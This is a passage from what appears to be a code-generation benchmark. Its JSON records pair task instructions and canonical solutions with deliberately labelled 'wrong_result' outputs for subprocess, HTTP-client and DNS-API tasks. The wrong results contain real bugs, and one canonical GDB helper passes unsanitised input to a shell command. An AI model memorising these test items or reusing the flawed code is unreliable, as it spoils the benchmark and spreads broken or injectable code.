    "wrong_result": "```python\nimport logging\nimport tempfile\nimport subprocess\nimport os\n\nclass PhonetisaurusG2P:\n    def __init__(self, fst_model=None, nbest=None):\n        self.fst_model = fst_model\n        self.nbest = nbest\n        self._logger = logging.getLogger(__name__)\n        if not self.fst_model:\n            self._logger.warning(\"No FST model provided. Translation will fail unless one is specified.\")\n\n    def execute(self, fst_model, input, is_file=False, nbest=None):\n        cmd = [\"phonetisaurus-g2p\", \"--model\", fst_model, \"--input\", input]\n        if is_file:\n            cmd.append(\"--isfile\")\n        if nbest:\n            cmd.extend([\"--nbest\", str(nbest)])\n        try:\n            result = subprocess.run(cmd, capture_output=True, text=True, check=True)\n            lines = result.stdout.strip().split(\"\\n\")\n            return {line.split()[0]: line.split()[1:] for line in lines}\n        except subprocess.CalledProcessError as e:\n            self._logger.error(f\"Command execution failed: {e}\")\n            raise\n\n    def _translate_word(self, word):\n        with tempfile.NamedTemporaryFile(mode='w+', delete=False) as tmpfile:\n            tmpfile.write(word + \"\\n\")\n            tmpfile.flush()\n            path = tmpfile.name\n        try:\n            result = self.execute(self.fst_model, path, is_file=True, nbest=self.nbest)\n            os.remove(path)\n            return result\n        except Exception as e:\n            self._logger.error(f\"Word translation failed: {e}\")\n            raise\n\n    def _translate_words(self, words):\n        with tempfile.NamedTemporaryFile(mode='w+', delete=False) as tmpfile:\n            tmpfile.write(\"\\n\".join(words))\n            tmpfile.flush()\n            path = tmpfile.name\n        try:\n            result = self.execute(self.fst_model, path, is_file=True, nbest=self.nbest)\n            os.remove(path)\n            return result\n        except Exception as e:\n            self._logger.error(f\"Words translation failed: {e}\")\n            raise\n\n    def translate(self, words):\n        if isinstance(words, list):\n            return self._translate_words(words)\n        else:\n            return self._translate_word(words)\n```"
  },
  {
    "Task_id": 287,
    "Instruction": "Task Description: Create a function that inspects the value of a Python object in a running process by its memory address using GDB debugger through subprocess communication.\n\nFunction Description: The function uses GDB to attach to a running Python process and inspect the value of a Python object at a specified memory address. It establishes inter-process communication using subprocess.PIPE to capture GDB's output and parse the result.\n\nInput:\n- pid: [int] - Process ID of the target Python process\n- address: [str/int] - Memory address of the Python object to inspect (can be hex string or integer)\n\nOutput:\n- [str] - The string representation of the inspected Python object as returned by GDB, or None if the address couldn't be resolved",
    "Canonical_solution": "import sys\nimport subprocess\n\nencoding = sys.getdefaultencoding()\n\ndef inspect(pid, address):\n    \"Return the value of an object in a given process at the specified address\"\n    cmd = ' '.join([\n        'gdb --quiet -p %s -batch' % pid,\n        '-eval-command=\"print (PyObject *)%s\"' % address,\n    ])\n    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n    for line in p.communicate()[0].decode(encoding).split('\\n'):\n        if line.startswith('$1 = '):\n            return line[5:]",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\nimport re\n\ndef inspect_python_object(pid, address):\n    try:\n        if isinstance(address, int):\n            address = hex(address)\n        gdb_commands = [\n            f\"attach {pid}\",\n            \"set pagination off\",\n            f\"p (char *)((PyVarObject *){address})->ob_type->tp_name\",\n            f\"x/s {address}\"\n        ]\n        process = subprocess.Popen(\n            [\"gdb\", \"-q\", \"--batch\"],\n            stdin=subprocess.PIPE,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            text=True\n        )\n        stdout, stderr = process.communicate(\"\\n\".join(gdb_commands))\n        if \"No such process\" in stderr:\n            return None\n        match = re.search(r'\"(.*?)\"', stdout)\n        if match:\n            return match.group(1)\n        return None\n    except Exception:\n        return None\n```"
  },
  {
    "Task_id": 29,
    "Instruction": "Task Description: Implement a robust HTTP client class in Python that handles both HTTP and HTTPS connections, supports proxy configuration, and manages connection timeouts and keep-alive settings.\n\nClass Description: The MNSHttp class provides a wrapper around Python's http.client module to handle HTTP/HTTPS requests with additional features like proxy support, connection timeout management, and keep-alive functionality.\n\nAttributes:\n- host: str - The target server hostname or IP address\n- is_https: bool - Flag indicating whether to use HTTPS (True) or HTTP (False)\n- connection_timeout: int - Connection timeout in seconds (default: 60)\n- keep_alive: bool - Flag for maintaining persistent connections (default: True)\n- request_size: int - Tracks the size of the last request sent\n- response_size: int - Tracks the size of the last response received\n- logger: Logger - Optional logger for debugging information\n- proxy: str - Optional proxy server configuration\n- conn: HTTPConnection/HTTPSConnection - The active connection object\n\nMethods:\n- __init__(host, connection_timeout=60, keep_alive=True, logger=None, is_https=False) -> None - Initializes the HTTP client with connection parameters\n- _new_conn() -> HTTPConnection/HTTPSConnection - Creates a new connection object based on current configuration\n- _basic_auth_str(username, password) -> str - Generates Basic Auth header string\n- get_env_proxy() -> str - Retrieves proxy configuration from environment variables\n- set_connection_timeout(connection_timeout) -> None - Updates the connection timeout and recreates the connection if needed\n- send_request(req_inter) -> ResponseInternal - Sends an HTTP request and returns the response, handling proxy configuration and connection management\n\nHelper Classes:\n- MNSHTTPConnection(host, port=None, strict=None, connection_timeout=60) - Custom HTTP connection with timeout support and request size tracking\n- MNSHTTPSConnection(host, port=None) - Custom HTTPS connection with request size tracking\n\nBoth connection classes extend their respective http.client counterparts and add:\n- request_length tracking\n- Custom connect() implementation for MNSHTTPConnection with timeout support\n- Overridden send() method to track request size\n- Standardized request() method initialization",
    "Canonical_solution": "import base64\nimport socket\nfrom http.client import HTTPConnection, BadStatusLine, HTTPSConnection\nfrom urllib.parse import urlparse, unquote\nimport os\n\nclass MNSHttp:\n    def __init__(self, host, connection_timeout=60, keep_alive=True, logger=None, is_https=False):\n        self.host = host\n        self.is_https = is_https\n        self.connection_timeout = connection_timeout\n        self.keep_alive = keep_alive\n        self.request_size = 0\n        self.response_size = 0\n        self.logger = logger\n        self.proxy = None\n        self.conn = self._new_conn()\n        if self.logger:\n            self.logger.info(\"InitMNSHttp KeepAlive:%s ConnectionTime:%s\" % (self.keep_alive, self.connection_timeout))\n\n    def _new_conn(self):\n        if self.is_https:\n            return MNSHTTPSConnection(self.host)\n        else:\n            return MNSHTTPConnection(self.host, connection_timeout=self.connection_timeout)\n\n    def _basic_auth_str(self, username, password):\n        if isinstance(username, str):\n            username = username.encode()\n        if isinstance(password, str):\n            password = password.encode()\n        return 'Basic ' + base64.b64encode(b':'.join((username, password))).strip().decode()\n\n    def get_env_proxy(self):\n        if self.is_https:\n            return os.getenv('https_proxy') or os.getenv('HTTPS_PROXY')\n        else:\n            return os.getenv('http_proxy') or os.getenv('HTTP_PROXY')\n\n    def set_connection_timeout(self, connection_timeout):\n        self.connection_timeout = connection_timeout\n        if not self.is_https:\n            if self.conn:\n                self.conn.close()\n            self.conn = MNSHTTPConnection(self.host, connection_timeout=connection_timeout)\n\n    def send_request(self, req_inter):\n        try:\n            if self.logger:\n                self.logger.debug(\"SendRequest %s\" % req_inter)\n\n            proxy = self.get_env_proxy()\n            if proxy:\n                url = urlparse(proxy)\n                self.conn.close()\n                if url.username:\n                    req_inter.header['Proxy-Authorization'] = self._basic_auth_str(unquote(url.username), unquote(url.password))\n                if self.is_https:\n                    self.conn = MNSHTTPSConnection(url.hostname, url.port)\n                else:\n                    self.conn = MNSHTTPConnection(url.hostname, url.port, connection_timeout=self.connection_timeout)\n                self.conn.set_tunnel(self.host, headers=req_inter.header)\n            else:\n                if self.conn.host != self.host:\n                    self.conn.close()\n                    self.conn = self._new_conn()\n\n            self.conn.request(req_inter.method, 'http://%s%s' % (self.host, req_inter.uri), req_inter.data, req_inter.header)\n            self.conn.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n            try:\n                http_resp = self.conn.getresponse()\n            except BadStatusLine:\n                self.conn.close()\n                self.conn.request(req_inter.method, req_inter.uri, req_inter.data, req_inter.header)\n                self.conn.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)\n                http_resp = self.conn.getresponse()\n            \n            headers = dict(http_resp.getheaders())\n            resp_inter = ResponseInternal(status=http_resp.status, header=headers, data=http_resp.read())\n            self.request_size = self.conn.request_length\n            self.response_size = len(resp_inter.data)\n            \n            if not self.is_keep_alive():\n                self.conn.close()\n            if self.logger:\n                self.logger.debug(\"GetResponse %s\" % resp_inter)\n            return resp_inter\n        except Exception as e:\n            self.conn.close()\n            raise MNSClientNetworkException(\"NetWorkException\", str(e), req_inter.get_req_id())\n\nclass MNSHTTPConnection(HTTPConnection):\n    def __init__(self, host, port=None, strict=None, connection_timeout=60):\n        HTTPConnection.__init__(self, host, port, strict)\n        self.request_length = 0\n        self.connection_timeout = connection_timeout\n\n    def send(self, str):\n        HTTPConnection.send(self, str)\n        self.request_length += len(str)\n\n    def request(self, method, url, body=None, headers={}):\n        self.request_length = 0\n        HTTPConnection.request(self, method, url, body, headers)\n\n    def connect(self):\n        msg = \"getaddrinfo returns an empty list\"\n        for res in socket.getaddrinfo(self.host, self.port, 0, socket.SOCK_STREAM):\n            af, socktype, proto, canonname, sa = res\n            try:\n                self.sock = socket.socket(af, socktype, proto)\n                self.sock.settimeout(self.connection_timeout)\n                self.sock.connect(sa)\n            except socket.error as msg:\n                if self.sock:\n                    self.sock.close()\n                self.sock = None\n                continue\n            break\n        if not self.sock:\n            raise socket.error(msg)\n\nclass MNSHTTPSConnection(HTTPSConnection):\n    def __init__(self, host, port=None):\n        HTTPSConnection.__init__(self, host, port)\n        self.request_length = 0\n\n    def send(self, str):\n        HTTPSConnection.send(self, str)\n        self.request_length += len(str)\n\n    def request(self, method, url, body=None, headers={}):\n        self.request_length = 0\n        HTTPSConnection.request(self, method, url, body, headers)",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport http.client\nimport socket\nimport ssl\nimport os\nfrom urllib.parse import urlparse\nimport logging\n\nclass MNSHTTPConnection(http.client.HTTPConnection):\n    def __init__(self, host, port=None, strict=None, connection_timeout=60):\n        super().__init__(host, port, strict)\n        self.connection_timeout = connection_timeout\n        self.request_length = 0\n\n    def connect(self):\n        try:\n            sock = socket.create_connection((self.host, self.port), timeout=self.connection_timeout)\n            self.sock = sock\n        except socket.error as e:\n            raise ConnectionError(f\"Failed to connect: {e}\")\n\n    def send(self, data):\n        if self.sock is None:\n            raise ConnectionError(\"Not connected\")\n        sent = self.sock.send(data)\n        self.request_length += len(data)\n        return sent\n\n\nclass MNSHTTPSConnection(MNSHTTPConnection, http.client.HTTPSConnection):\n    def __init__(self, host, port=None, strict=None, connection_timeout=60):\n        MNSHTTPConnection.__init__(self, host, port, strict, connection_timeout)\n\n    def connect(self):\n        try:\n            sock = socket.create_connection((self.host, self.port), timeout=self.connection_timeout)\n            tlssock = ssl.wrap_socket(sock)\n            self.sock = tlssock\n        except (socket.error, ssl.SSLError) as e:\n            raise ConnectionError(f\"HTTPS connection failed: {e}\")\n\n\nclass ResponseInternal:\n    def __init__(self, status, reason, headers, body):\n        self.status = status\n        self.reason = reason\n        self.headers = headers\n        self.body = body\n        self.size = len(body)\n\n\nclass MNSHttp:\n    def __init__(self, host, connection_timeout=60, keep_alive=True, logger=None, is_https=False):\n        self.host = host\n        self.is_https = is_https\n        self.connection_timeout = connection_timeout\n        self.keep_alive = keep_alive\n        self.request_size = 0\n        self.response_size = 0\n        self.logger = logger or logging.getLogger(__name__)\n        self.proxy = self.get_env_proxy()\n        self.conn = None\n\n    def _new_conn(self):\n        if self.is_https:\n            conn_class = MNSHTTPSConnection\n        else:\n            conn_class = MNSHTTPConnection\n        if self.proxy:\n            proxy_url = urlparse(self.proxy)\n            self.host = proxy_url.hostname\n            self.is_https = proxy_url.scheme == 'https'\n        conn = conn_class(\n            host=self.host,\n            connection_timeout=self.connection_timeout\n        )\n        return conn\n\n    def _basic_auth_str(self, username, password):\n        import base64\n        credentials = f\"{username}:{password}\"\n        encoded_credentials = base64.b64encode(credentials.encode()).decode('utf-8')\n        return f\"Basic {encoded_credentials}\"\n\n    def get_env_proxy(self):\n        for env_var in ['http_proxy', 'HTTP_PROXY', 'https_proxy', 'HTTPS_PROXY']:\n            if env_var in os.environ:\n                return os.environ[env_var]\n        return None\n\n    def set_connection_timeout(self, connection_timeout):\n        self.connection_timeout = connection_timeout\n        if self.conn:\n            self.conn.close()\n            self.conn = self._new_conn()\n\n    def send_request(self, req_inter):\n        if not hasattr(req_inter, 'method') or not hasattr(req_inter, 'path'):\n            raise ValueError(\"Request object must have method and path attributes\")\n\n        if not self.conn or not self.keep_alive or self.conn.sock is None:\n            self.conn = self._new_conn()\n\n        headers = getattr(req_inter, 'headers', {})\n        body = getattr(req_inter, 'body', None)\n\n        try:\n            self.conn.request(req_inter.method, req_inter.path, body=body, headers=headers)\n            response = self.conn.getresponse()\n            resp_data = response.read()\n            self.request_size = self.conn.request_length\n            self.response_size = len(resp_data)\n            return ResponseInternal(\n                status=response.status,\n                reason=response.reason,\n                headers=dict(response.getheaders()),\n                body=resp_data\n            )\n        except Exception as e:\n            self.logger.error(f\"Request failed: {e}\")\n            raise\n```"
  },
  {
    "Task_id": 292,
    "Instruction": "Task Description: Create a Python class that facilitates executing system commands with options for streaming output, sudo execution, and handling both string and list-based commands.\n\nClass Description: The ProcessRunner class provides a flexible way to execute system commands with various configurations. It handles command execution with options for streaming output in real-time, sudo privileges, and supports both string and list-formatted commands. The class manages subprocess creation, output capture, error handling, and return code collection.\n\nAttributes:\n- None (This class doesn't maintain persistent attributes between method calls)\n\nMethods:\n- _read_output(pipe, q) -> None - Private method that continuously reads from a pipe and puts data into a queue for output streaming.\n- _stream_output(comm, shell) -> tuple - Executes a command with streaming output capability, returns (stdout, stderr, returncode).\n- _decode(value) -> str - Helper method to decode byte strings to unicode (Python 3 compatibility).\n- _run_command(comm, shell) -> tuple - Executes a command and returns output after completion, returns (stdout, stderr, returncode).\n- execute(command_list, leave_on_fail) -> tuple/list - Main interface for command execution, handles multiple commands with various options. Returns single result tuple or list of tuples depending on input.\n\nInput Parameters:\n- For execute():\n  - command_list: dict/list - Either a single command dictionary or list of command dictionaries\n  - leave_on_fail: bool - Whether to stop execution if a command fails (default: False)\n- Command dictionary structure:\n  - args: list/str - The command to execute (either as list or string)\n  - shell: bool - Whether to use shell execution (default: False)\n  - stream: bool - Whether to stream output in real-time (default: False)\n  - sudo: bool - Whether to execute with sudo (default: False)\n\nOutput:\n- For single command: tuple (stdout_output, stderr_output, return_code)\n- For multiple commands: list of tuples [(stdout, stderr, returncode), ...]\n- On error: tuple (\"\", \"Command not found!\", 1)",
    "Canonical_solution": "import sys\nimport subprocess\nimport threading\nimport shlex\ntry:\n    from Queue import Queue, Empty\nexcept:\n    from queue import Queue, Empty\n\nON_POSIX = 'posix' in sys.builtin_module_names\n\nclass ProcessRunner:\n    def __init__(self):\n        pass\n\n    def _read_output(self, pipe, q):\n        try:\n            for line in iter(lambda: pipe.read(1), b''):\n                q.put(line)\n        except ValueError:\n            pass\n        pipe.close()\n\n    def _stream_output(self, comm, shell=False):\n        output = error = \"\"\n        p = ot = et = None\n        try:\n            if shell and type(comm) is list:\n                comm = \" \".join(shlex.quote(x) for x in comm)\n            if not shell and type(comm) is str:\n                comm = shlex.split(comm)\n            p = subprocess.Popen(comm, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE, \n                                bufsize=0, universal_newlines=True, close_fds=ON_POSIX)\n            \n            q = Queue()\n            t = threading.Thread(target=self._read_output, args=(p.stdout, q))\n            t.daemon = True\n            \n            qe = Queue()\n            te = threading.Thread(target=self._read_output, args=(p.stderr, qe))\n            te.daemon = True\n            \n            t.start()\n            te.start()\n\n            while True:\n                c = z = \"\"\n                try:\n                    c = q.get_nowait()\n                except Empty:\n                    pass\n                else:\n                    sys.stdout.write(c)\n                    output += c\n                    sys.stdout.flush()\n                try:\n                    z = qe.get_nowait()\n                except Empty:\n                    pass\n                else:\n                    sys.stderr.write(z)\n                    error += z\n                    sys.stderr.flush()\n                p.poll()\n                if c==z==\"\" and p.returncode != None:\n                    break\n\n            o, e = p.communicate()\n            return (output+o, error+e, p.returncode)\n        except:\n            if p:\n                return (output, error, p.returncode)\n            return (\"\", \"Command not found!\", 1)\n\n    def _decode(self, value):\n        if sys.version_info >= (3,0) and isinstance(value, bytes):\n            return value.decode(\"utf-8\",\"ignore\")\n        return value\n\n    def _run_command(self, comm, shell=False):\n        try:\n            if shell and type(comm) is list:\n                comm = \" \".join(shlex.quote(x) for x in comm)\n            if not shell and type(comm) is str:\n                comm = shlex.split(comm)\n            p = subprocess.Popen(comm, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n            c = p.communicate()\n            return (self._decode(c[0]), self._decode(c[1]), p.returncode)\n        except:\n            return (\"\", \"Command not found!\", 1)\n\n    def execute(self, command_list, leave_on_fail=False):\n        if type(command_list) is dict:\n            command_list = [command_list]\n        output_list = []\n        for comm in command_list:\n            args = comm.get(\"args\", [])\n            shell = comm.get(\"shell\", False)\n            stream = comm.get(\"stream\", False)\n            sudo = comm.get(\"sudo\", False)\n            \n            if not len(args):\n                continue\n                \n            if sudo:\n                out = self._run_command([\"which\", \"sudo\"])\n                if \"sudo\" in out[0]:\n                    if type(args) is list:\n                        args.insert(0, out[0].replace(\"\\n\", \"\"))\n                    elif type(args) is str:\n                        args = out[0].replace(\"\\n\", \"\") + \" \" + args\n\n            if stream:\n                out = self._stream_output(args, shell)\n            else:\n                out = self._run_command(args, shell)\n                \n            output_list.append(out)\n            if leave_on_fail and out[2] != 0:\n                break\n                \n        return output_list[0] if len(output_list) == 1 else output_list",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\nimport sys\nimport threading\nimport shlex\nfrom queue import Queue\n\nclass ProcessRunner:\n    def _read_output(self, pipe, q):\n        for line in iter(pipe.readline, b''):\n            if line:\n                q.put(line)\n        pipe.close()\n\n    def _decode(self, value):\n        if isinstance(value, bytes):\n            try:\n                return value.decode(sys.getdefaultencoding())\n            except UnicodeDecodeError:\n                return value.decode(sys.stdin.encoding or 'utf-8', errors='replace')\n        return value\n\n    def _stream_output(self, comm, shell):\n        stdout_queue = Queue()\n        stderr_queue = Queue()\n        stdout_thread = None\n        stderr_thread = None\n\n        process = subprocess.Popen(\n            comm,\n            shell=shell,\n            stdout=subprocess.PIPE,\n            stderr=subprocess.PIPE,\n            stdin=subprocess.DEVNULL,\n            close_fds=True,\n            universal_newlines=False\n        )\n\n        if process.stdout:\n            stdout_thread = threading.Thread(target=self._read_output, args=(process.stdout, stdout_queue))\n            stdout_thread.start()\n        if process.stderr:\n            stderr_thread = threading.Thread(target=self._read_output, args=(process.stderr, stderr_queue))\n            stderr_thread.start()\n\n        stdout_lines = []\n        stderr_lines = []\n\n        while True:\n            still_running = False\n            if stdout_thread and stdout_thread.is_alive():\n                still_running = True\n                while not stdout_queue.empty():\n                    line = self._decode(stdout_queue.get_nowait())\n                    stdout_lines.append(line)\n            if stderr_thread and stderr_thread.is_alive():\n                still_running = True\n                while not stderr_queue.empty():\n                    line = self._decode(stderr_queue.get_nowait())\n                    stderr_lines.append(line)\n\n            if not still_running:\n                break\n\n        if stdout_thread:\n            stdout_thread.join()\n        if stderr_thread:\n            stderr_thread.join()\n\n        while not stdout_queue.empty():\n            stdout_lines.append(self._decode(stdout_queue.get_nowait()))\n        while not stderr_queue.empty():\n            stderr_lines.append(self._decode(stderr_queue.get_nowait()))\n\n        process.wait()\n        stdout = ''.join(stdout_lines)\n        stderr = ''.join(stderr_lines)\n        returncode = process.returncode\n\n        return stdout, stderr, returncode\n\n    def _run_command(self, comm, shell):\n        try:\n            process = subprocess.run(\n                comm,\n                shell=shell,\n                stdout=subprocess.PIPE,\n                stderr=subprocess.PIPE,\n                stdin=subprocess.DEVNULL,\n                close_fds=True,\n                universal_newlines=False\n            )\n        except FileNotFoundError:\n            return \"\", \"Command not found!\", 1\n\n        stdout = self._decode(process.stdout) if process.stdout else \"\"\n        stderr = self._decode(process.stderr) if process.stderr else \"\"\n        return stdout, stderr, process.returncode\n\n    def execute(self, command_list, leave_on_fail=False):\n        result = []\n\n        if not isinstance(command_list, list):\n            command_list = [command_list]\n\n        for cmd_dict in command_list:\n            args = cmd_dict.get('args')\n            shell = cmd_dict.get('shell', False)\n            stream = cmd_dict.get('stream', False)\n            sudo = cmd_dict.get('sudo', False)\n\n            if sudo:\n                if isinstance(args, str):\n                    args = ['sudo'] + shlex.split(args)\n                elif isinstance(args, list):\n                    args = ['sudo'] + args\n\n            if stream:\n                output = self._stream_output(args, shell)\n            else:\n                output = self._run_command(args, shell)\n\n            result.append(output)\n\n            if leave_on_fail and output[2] != 0:\n                break\n\n        if len(result) == 1:\n            return result[0]\n        return result\n```"
  },
  {
    "Task_id": 294,
    "Instruction": "Task Description: Implement a set of functions to interact with the Mercurial (hg) version control system to retrieve branch information and repository status using subprocess communication.\n\nFunction Description: The functions use Python's subprocess module to execute Mercurial commands and capture their output through pipes. The functions handle process creation, communication, and output parsing to provide repository information.\n\nInput: None (functions retrieve information directly from the Mercurial repository in the current working directory)\n\nOutput:\n\n_get_hg_branch() -> str - Returns the current Mercurial branch name as a string\n_get_hg_status(output: tuple) -> list - Returns a list of status lines from Mercurial output\nbuild_stats() -> tuple - Returns a tuple containing (status_list, branch_name) or (None, None) if an error occurs",
    "Canonical_solution": "import subprocess\nfrom ..utils import get_subprocess_env\n\ndef _get_hg_branch():\n    p = subprocess.Popen([\"hg\", \"branch\"],\n                         stdout=subprocess.PIPE,\n                         stderr=subprocess.PIPE,\n                         env=get_subprocess_env())\n    branch = p.communicate()[0].decode(\"utf-8\").rstrip('\\n')\n    return branch\n\ndef _get_hg_status(output):\n    return output[0].decode(\"utf-8\").splitlines()\n\ndef build_stats():\n    try:\n        p = subprocess.Popen([\"hg\", \"status\"],\n                             stdout=subprocess.PIPE,\n                             stderr=subprocess.PIPE,\n                             env=get_subprocess_env())\n    except OSError:\n        return None, None\n    pdata = p.communicate()\n    if p.returncode != 0:\n        return None, None\n    status = _get_hg_status(pdata)\n    branch = _get_hg_branch()\n    return status, branch",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\ndef _get_hg_branch():\n    try:\n        result = subprocess.run(['hg', 'branch'], capture_output=True, text=True, check=True)\n        return result.stdout.strip()\n    except (subprocess.CalledProcessError, FileNotFoundError):\n        return None\n\ndef _get_hg_status(output):\n    try:\n        result = subprocess.run(['hg', 'status'] + list(output), capture_output=True, text=True, check=True)\n        return result.stdout.strip().splitlines()\n    except (subprocess.CalledProcessError, FileNotFoundError):\n        return None\n\ndef build_stats():\n    branch_name = _get_hg_branch()\n    if branch_name is None:\n        return (None, None)\n    status_list = _get_hg_status(('--modified', '--added', '--removed'))\n    if status_list is None:\n        return (None, None)\n    return (status_list, branch_name)\n```"
  },
  {
    "Task_id": 295,
    "Instruction": "Task Description: Create a function that reads audio data from bytes using FFmpeg and converts it into a numpy array with specified sampling rate.\n\nFunction Description: The function `ffmpeg_read` takes raw audio bytes and converts them into a mono audio waveform with a specified sampling rate using FFmpeg. The audio is converted to 32-bit floating-point format. The function handles FFmpeg process creation, data piping, and conversion to numpy array.\n\nInput:\n- `bpayload`: bytes - Raw audio data to be processed\n- `sampling_rate`: int - Target sampling rate for the output audio\n\nOutput:\n- np.array - A numpy array containing the audio waveform in 32-bit floating-point format\n\nNote: The function raises `ValueError` if FFmpeg is not found or if the output audio is malformed.",
    "Canonical_solution": "import subprocess\nimport numpy as np\n\ndef ffmpeg_read(bpayload: bytes, sampling_rate: int) -> np.array:\n    \"\"\"\n    Helper function to read an audio file through ffmpeg.\n    \"\"\"\n    ar = f\"{sampling_rate}\"\n    ac = \"1\"\n    format_for_conversion = \"f32le\"\n    ffmpeg_command = [\n        \"ffmpeg\",\n        \"-i\",\n        \"pipe:0\",\n        \"-ac\",\n        ac,\n        \"-ar\",\n        ar,\n        \"-f\",\n        format_for_conversion,\n        \"-hide_banner\",\n        \"-loglevel\",\n        \"quiet\",\n        \"pipe:1\",\n    ]\n\n    try:\n        ffmpeg_process = subprocess.Popen(ffmpeg_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE)\n    except FileNotFoundError:\n        raise ValueError(\"ffmpeg was not found but is required to load audio files from filename\")\n    output_stream = ffmpeg_process.communicate(bpayload)\n    out_bytes = output_stream[0]\n\n    audio = np.frombuffer(out_bytes, np.float32)\n    if audio.shape[0] == 0:\n        raise ValueError(\"Malformed soundfile\")\n    return audio",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport numpy as np\nimport subprocess\nimport shlex\n\ndef ffmpeg_read(bpayload, sampling_rate):\n    args = (\n        f\"ffmpeg -i pipe:0 -f f32le -ar {sampling_rate} -ac 1 -\"\n    )\n    args = shlex.split(args)\n    p = subprocess.Popen(\n        args,\n        stdin=subprocess.PIPE,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.DEVNULL,\n        startupinfo=None\n    )\n    out, _ = p.communicate(input=bpayload)\n    if not out:\n        raise ValueError(\"FFmpeg output is empty or malformed\")\n    try:\n        audio = np.frombuffer(out, dtype=np.float32)\n    except (ValueError, TypeError):\n        raise ValueError(\"Failed to convert FFmpeg output to numpy array\")\n    return audio\n```"
  },
  {
    "Task_id": 297,
    "Instruction": "Task Description: Create a function that executes a system command in a subprocess, captures its output and error streams, and handles potential errors appropriately.\n\nFunction Description: The function `run_cmd` executes a given system command as a subprocess, with options for verbose output. It captures both stdout and stderr streams, provides real-time output when in verbose mode, and raises an exception if the command fails (non-zero return code). The function ensures proper process cleanup and returns the command's output and error streams.\n\nInput:\n- command: List[str] - A list of strings representing the command and its arguments to be executed\n- verbose: bool (optional, default=False) - If True, prints real-time output of the command execution\n\nOutput:\n- Returns: Tuple[bytes, bytes] - A tuple containing the stdout and stderr output from the command\n- Raises: Exception - If the command returns a non-zero exit code, includes the return code and output streams in the exception message",
    "Canonical_solution": "import subprocess\nimport sys\n\ndef run_cmd(command, verbose=False):\n    if verbose:\n        print(\"Running command:\", \" \".join(command))\n    proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n    if verbose:\n        while proc.poll() is None:\n            string = b\"\"\n            for c in iter(lambda: proc.stdout.read(1), string):\n                c = c.decode(\"ascii\")\n                sys.stdout.write(c)\n\n        sys.stdout.flush()\n\n    proc.wait()\n    if proc.returncode != 0:\n        out, err = proc.communicate()\n        raise Exception(\n            \"The training could not be completed (returncode=%i): %s %s\"\n            % (proc.returncode, out, err)\n        )\n\n    out, err = proc.communicate()",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\ndef run_cmd(command, verbose=False):\n    process = subprocess.Popen(\n        command,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE,\n        text=False\n    )\n    stdout, stderr = process.communicate()\n    if verbose:\n        print(stdout.decode())\n        print(stderr.decode(), file=subprocess.STDOUT)\n    if process.returncode != 0:\n        raise Exception(f\"Command failed with return code {process.returncode}: {command}\\nOutput: {stdout}\\nError: {stderr}\")\n    return stdout, stderr\n```"
  },
  {
    "Task_id": 30,
    "Instruction": "Task Description: Implement a Python class to interact with the DNSPod API for managing DNS records, including querying domain information, listing records, and updating DNS records.\n\nClass Description: DNSPodAPI is a class that provides methods to interact with DNSPod's API for DNS management. It handles authentication, request construction, and response processing for various DNS operations.\n\nAttributes:\n\nSITE: str - The DNSPod API endpoint (dnsapi.cn)\nMETHOD: str - Default HTTP method for requests (POST)\nTOKEN_PARAM: str - Parameter name for authentication token (login_token)\nDEFAULT: str - Default value for record line (\"\u9ed8\u8ba4\")\nLENGTH: str - Parameter name for response length (\"length\")\nID: str - DNSPod API token ID\nTOKEN: str - DNSPod API token key\nPROXY: str - Optional proxy server address\nTTL: int - Time-to-live value for DNS records\ndomain_list: dict - Cache of domain names and their IDs\nrecords: dict - Cache of DNS records organized by domain ID\nrecord_keys: tuple - Valid fields for DNS records\n\nMethods:\n\n__init__(token_id=None, token_key=None, proxy=None, ttl=None) -> None - Initializes the DNSPodAPI instance with authentication tokens and optional proxy/ttl settings.\n\nrequest(action, param=None, **params) -> dict - Makes an authenticated API request to the specified action with given parameters. Returns parsed JSON response or raises an exception on error.\n\nget_domain_info(domain) -> tuple - Splits a domain into its main and subdomain parts, returning the domain ID and subdomain.\n\nget_domain_id(domain) -> str - Retrieves and caches the ID for a given domain name.\n\nget_records(did, **conditions) -> dict - Retrieves DNS records for a domain ID that match given conditions (e.g., name, type).\n\nupdate_record(domain, value, record_type=\"A\") -> dict - Updates or creates a DNS record for the given domain with the specified value and record type.",
    "Canonical_solution": "from http.client import HTTPSConnection\nfrom urllib.parse import urlencode\nfrom json import loads as jsondecode\nfrom os import environ\n\nclass DNSPodAPI:\n    def __init__(self, token_id=None, token_key=None, proxy=None, ttl=None):\n        self.SITE = \"dnsapi.cn\"\n        self.METHOD = \"POST\"\n        self.TOKEN_PARAM = \"login_token\"\n        self.DEFAULT = \"\u9ed8\u8ba4\"\n        self.LENGTH = \"length\"\n        \n        self.ID = token_id\n        self.TOKEN = token_key\n        self.PROXY = proxy\n        self.TTL = ttl\n        self.domain_list = {}\n        self.records = {}\n        self.record_keys = (\"id\", \"name\", \"type\", \"line\", \"line_id\", \"enabled\", \"mx\", \"value\")\n\n    def request(self, action, param=None, **params):\n        if param:\n            params.update(param)\n        params = {k: v for k, v in params.items() if v is not None}\n        params.update({self.TOKEN_PARAM: \"%s,%s\" % (self.ID, self.TOKEN), 'format': 'json', self.LENGTH: \"3000\"})\n        \n        if self.PROXY:\n            conn = HTTPSConnection(self.PROXY)\n            conn.set_tunnel(self.SITE, 443)\n        else:\n            conn = HTTPSConnection(self.SITE)\n\n        conn.request(self.METHOD, '/' + action, urlencode(params), {\n            \"Content-type\": 